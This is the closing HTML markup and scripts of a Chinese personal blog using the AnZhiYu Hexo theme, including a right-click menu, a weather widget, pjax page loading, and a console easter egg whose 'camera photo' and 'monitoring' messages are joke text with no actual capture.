class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
+  "CONFIG": {
+    "modules": "0124",
+    "background": "2",
+    "tmpColor": "FFFFFF",
+    "tmpSize": "16",
+    "cityColor": "FFFFFF",
+    "citySize": "16",
+    "aqiColor": "E8D87B",
+    "aqiSize": "16",
+    "weatherIconSize": "24",
+    "alertIconSize": "18",
+    "padding": "10px 10px 10px 10px",
+    "shadow": "0",
+    "language": "auto",
+    "borderRadius": "20",
+    "fixed": "true",
+    "vertical": "top",
+    "horizontal": "left",
+    "left": "20",
+    "top": "7.1",
+    "key": "df245676fb434a0691ead1c63341cd94"
+  }
+}
+</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/10/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2023 By 安知鱼 V1.6.8",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 薯条 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
